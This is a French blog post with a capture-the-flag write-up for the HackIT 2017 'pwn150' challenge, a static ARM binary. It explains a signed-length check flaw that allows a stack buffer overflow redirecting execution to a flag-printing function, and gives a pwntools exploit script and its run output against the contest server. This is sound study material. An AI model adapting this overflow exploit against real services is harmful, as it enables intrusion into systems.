---
layout: post
title: "HackIT CTF"
date: 27 Août 2017
comments: true
categories: wu
---
Le binaire en statique presente les caractéristiques suivantes:
```
Filename                 pwn150
File format              ELF32
Architecture             arm
Endianess                little endian
Entry point              0x10370
Loadables segments       2
Sections                 31

NX bit                   enabled
SSP                      disabled
Relro                    unknown
RPATH                    unknown
RUNPATH                  unknown
PIE                      disabled
```
Une faille réside dans le fait que si on entre un nombre > 32768, il apparait comme négatif dans le test
lors de la demande de la longueur du message. Il est alors possible de faire un buffer overflow sur la pile.
Il suffit de basculer sur le fonction affichant le flag (0x104d8) pour avoir ce flag.

```
PAD="ABCDEFGHIJKLMNOPQRSTUVWXYZ@@AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZ@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ@@@@AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ@@@@@AAAAABBBBBCCCCCDDDDDEEEEEFFFFFGGGGGHHHHHIIIIIJJJJJKKKKKLLLLLMMMMMNNNNNOOOOOPPPPPQQQQQRRRRRSSSSSTTTTTUUUUUVVVVVWWWWWXXXXXYYYYYZZZZZ@@@@@@AAAAAABBBBBBCCCCCCDDDDDDEEEEEEFFFFFFGGGGGGHHHHHHIIIIIIJJJJJJKKKKKKLLLLLLMMMMMMNNNNNNOOOOOOPPPPPPQQQQQQRRRRRRSS"

# mettre la longeur à 55000 donne un nombre négatif, le BOF est possible

p=remote(host,port)
print p.recvuntil("?")
p.sendline("A")
print p.recvuntil("N:")
p.sendline("Y")
print p.recvuntil("ssage:")
p.sendline("55000")
p.sendline(PAD+p32(0)+p32(0)+p32(0)+p32(0x104d8))
print p.recvall(1)
p.close()
```
On obtient le déroulement suivant:

```
[+] Opening connection to 165.227.98.55 on port 2222: Done
Welcome to our secured moon phase tracking server.
What is your name?

Hello, A!
Current moon phase: 1
Sorry, current moon phase is bad for showing flags.
A, do you want to leave us a feedback? Enter Y or N:
Please, enter length of your message:

[+] Receiving all data: Done (90B)
[*] Closed connection to 165.227.98.55 port 2222

Your opinion is very important to us.
Bye-bye!
h4ck1t{Astronomy_is_fun}
Have a nice day!

```
